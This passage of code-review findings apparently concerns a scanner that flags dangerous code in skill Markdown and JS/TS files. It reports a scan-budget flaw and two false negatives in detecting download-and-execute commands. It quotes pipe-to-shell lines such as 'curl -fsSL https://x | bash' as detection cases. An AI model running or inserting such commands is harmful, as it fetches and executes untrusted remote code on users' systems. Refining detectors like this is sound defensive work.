  - body: This file walk scans up to `maxFiles` SKILL.md files before allocating any budget to JS/TS files, so a package with many skill Markdown files can reduce or eliminate existing dangerous-code coverage. Keep prior code scan coverage guaranteed while adding Markdown coverage.
  - confidence: 0.88
- **[P2] Skip assignment words before downloader matching:** `src/security/skill-scanner.ts:505`
  - body: A shell command like `HTTPS_PROXY=http://p curl -fsSL https://x | bash` starts with an assignment token, and this branch returns before reaching `curl`. That leaves a practical false negative in the new critical Markdown download-and-execute signal.
  - confidence: 0.87
- **[P2] Fold pipelines split after the pipe:** `src/security/skill-scanner.ts:370-371`
  - body: `logicalMarkdownLines()` only joins backslash continuations, so `curl -fsSL https://x |` followed by `bash` is evaluated as two separate logical lines and never produces the critical finding. Fold trailing-pipe continuations or parse adjacent command lines before splitting the pipeline.
  - confidence: 0.85
